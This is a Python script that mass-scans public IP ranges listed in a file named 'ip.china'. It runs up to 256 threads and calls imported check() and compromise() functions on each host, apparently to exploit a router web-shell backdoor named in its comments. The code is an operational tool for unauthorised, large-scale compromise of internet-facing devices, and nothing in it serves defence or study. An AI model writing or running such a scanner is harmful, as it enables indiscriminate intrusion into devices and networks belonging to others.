#!/usr/bin/env python3.4
#encoding: utf-8


#backdoor: http://IP/web_shell_cmd.gch
#details: http://www.freebuf.com/news/58137.html

import sys
import netaddr
import time
import socket
import requests
import threading
import gc
import objgraph
from datetime import datetime
from log import log
from poc import check, compromise

i = 0
f = open('ip.china','r')

class probe(threading.Thread):
    
    def __init__(self, name, cidr):
        threading.Thread.__init__(self)
        self.name = name
        self.cidr = cidr

    def run(self):
        log(self.name, 'started')
        #self.ip_cidr_list = list(netaddr.IPNetwork(self.cidr))   # too much memory wasted
        self.ip_cidr_list = netaddr.IPNetwork(self.cidr).iter_hosts()
        for self.ip in self.ip_cidr_list:
            if self.ip.is_unicast() and not self.ip.is_private():
                try:
                    if check(self.ip):
                        compromise(self.ip)
                except:
                    log('run', '{}'.format(sys.exc_info()))

while True:
    while threading.active_count()>=256:
        time.sleep(7)
    line = f.readline()
    if len(line)==0:
        break
    new_thread = probe(str(i), line)
    new_thread.start()
    i = i + 1

time.sleep(36000)
sys.exit(0)
